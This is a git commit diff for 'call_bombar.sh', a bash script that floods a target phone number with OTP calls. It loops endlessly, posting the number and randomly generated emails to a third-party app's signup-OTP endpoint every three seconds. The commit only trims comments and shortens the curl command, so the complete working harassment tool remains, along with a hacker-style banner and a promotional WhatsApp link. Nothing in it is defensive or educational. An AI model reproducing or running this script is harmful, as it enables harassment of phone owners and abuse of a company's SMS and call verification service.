1137fc590ea6963c1f10833345226f119b0002e9
Professor AbheeBhai <160325811+Abeerking12@users.noreply.github.com>
2026-01-08 16:39:45 +0500

    Update call_bombar.sh

--- call_bombar.sh
+++ call_bombar.sh
@@ -1,6 +1,4 @@
 #!/bin/bash
-
-# Hacker style banner
 banner() {
     clear
     echo -e "\e[1;32m"
@@ -15,47 +13,23 @@ banner() {
     echo -e "\e[1;34m[+] Join my WhatsApp Channel:\e[0m \e[4;36mhttps://whatsapp.com/channel/0029Vb6duo97YSd4TU5OUo3K\e[0m"
     echo ""
 }
-
-# Generate random email
 generate_random_email() {
     head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 | sed 's/.*/&@gmail.com/'
 }
-
-# Graceful exit
 cleanup() {
     tput cnorm
-    echo -e "\n\e[0;31m[!] Exiting... CTRL+C detected.\e[0m"
+    echo -e "\n\e[0;31m[!] Exiting...\e[0m"
     exit 0
 }
 trap cleanup INT
-
-# Run banner
 banner
-
-# User input
-read -p $'\033[1;32m[?] Enter phone number (e.g., 03001234567): \033[0m' phone_number
-sleep 1
-
-# API URL
+read -p $'\033[1;32m[?] Enter phone number: \033[0m' phone_number
 API_URL="https://martbackend.herokuapp.com/user/signUpOtp"
-
-# Start bombing loop
 while true; do
     random_email=$(generate_random_email)
     JSON_BODY='{"phone":"'"$phone_number"'","email":"'"$random_email"'","name":"ali khan","referralCode":""}'
-
     echo -e "\n\e[1;36m[+] Sending call request to:\e[0m $phone_number"
-    echo -e "\e[1;34m[+] Using email:\e[0m $random_email"
-
-    curl -s -X POST "$API_URL" \
-         -H "accept: application/json, text/plain, */*" \
-         -H "Content-Type: application/json" \
-         -H "User-Agent: okhttp/4.9.2" \
-         -d "$JSON_BODY" \
-         --compressed
-
-    echo -e "\e[1;32m[✔] Request sent successfully!\e[0m"
-    echo -e "\e[1;90m----------------------------------------\e[0m"
-
+    curl -s -X POST "$API_URL" -H "Content-Type: application/json" -d "$JSON_BODY"
+    echo -e "\n\e[1;32m[✔] Request sent!\e[0m"
     sleep 3
 done
